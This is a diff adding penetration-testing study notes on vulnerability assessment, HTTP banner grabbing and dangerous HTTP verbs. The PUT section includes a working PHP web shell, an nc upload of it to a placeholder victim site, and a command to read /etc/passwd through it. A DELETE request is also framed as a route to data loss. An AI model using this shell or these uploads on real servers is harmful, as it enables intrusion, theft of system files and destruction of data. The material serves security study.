@@ -128,5 +128,85 @@
   - `nmap <scan type> 10.10.10.3,6,9` will only scan hosts 10.10.10.3 then ...10.6 ... 10.9
   - DO NOT give up on `filtered` ports (request is blocked by FW/ IDS), try to force them with `-Pn`
 
+### Vulnerability Assessment
+- Much more linear than pentesting and less effective as we have no way to prove those vulns are actually exploitable
+  - Scan probes to verify a vuln is **can lead to false positives**
+- Typical approach (rather than cycle): Engagment -> Information Gathering -> Footprinting & Scanning -> Vulnerability Assessment -> Reporting
+- Assessments on custom applications are more arduous as you have to more manual work than running several scanners
+
+### Web Attacks
+- Banner grabbing: 
+  - Can be obsfuscated as admins can change the banner info. That's where automated tools lik httprint excel, it will pick that up (signatrue-bsed)
+  - Netcat (Manual: HTTP-ONLY)
+    ```bash
+    nc <target address> 80 
+    HEAD / HTTP/1.0` #NOTE: PUT TWO EMPTY LINES AFTER! Also make sure the request is in UPPERCASE
+    
+    
+    ```
+   - If the banner grab is unsuccessful, it's probably because you left out the two extra empty lines after the request HEAD... that being the two empty lines after which the body goes if we had any.
+      - Sometimes might get lucky and get even OS running on that server
+  - OpenSSL (Manual: HTTPS) 
+    - `openssl s_client -connect target.site:443`
+    - `HEAD / HTTP/1.0`
+  - httprint (Automated)
+    ```bash
+    httprint -P0 -h <target hosts> -s <signature files>
+    httprint -P0 -h 1.2.3.4 -s /usr/share/httprint/signatures.txt #Example 
+    ```
+- HTTP Verbs
+  - `OPTIONS` gives us enabled HTTP verbs on the host
+  - **IMPORTANT: REST APIs use PUT/ DELETE to save files as normal operations, so do not report *ANY* verbs found without veryfing their impact**  
+  - `PUT` is the most dangerous as it uploads files to a server. **NOTE: Must write the correct size of the uploaded content**
+    ```bash 
+      PUT /path/to/destination HTTP/1.1
+      Host: www.website.com
+      
+      
+      <PUT data> 
+    ```
+    ```bash 
+      # Example
+      nc vicitm.site 80
+      PUT /payload.php HTTP/1.0
+      Content-type: text/html
+      Content-length: 20 # NOTE: You have to have know length of the contents before sending, wc -m payload.php gives us length in bytes
+    ```
+    - Great shell that works with `PUT`: 
+      ```php
+      <?php 
+      if (isset($_GET['cmd']))
+      {
+        $cmd = $_GET['cmd'];
+        echo '<pre>';
+        $result = shell_exec($cmd);
+        echo $result;
+        echo '<pre>';
+      }
+      ?>
+      ```
+      - We can now send requests on the site with `victim.site/shellweUploaded?cmd=cat /etc/passwd`
+  - `Delete` is another dangerous verb to lookout for - Deletes files off a server (DoS/ Data Loss)
+    ```bash 
+      DELETE /path/login.php HTTP/1.1 
+      Host: www.website.com
+    ```
+  - `POST` parameters (form data) only work in the **message body**
+   
+  
+  
+
+    
+    
+    
+  
+  
+
+
+
+
+
+
+
 
 
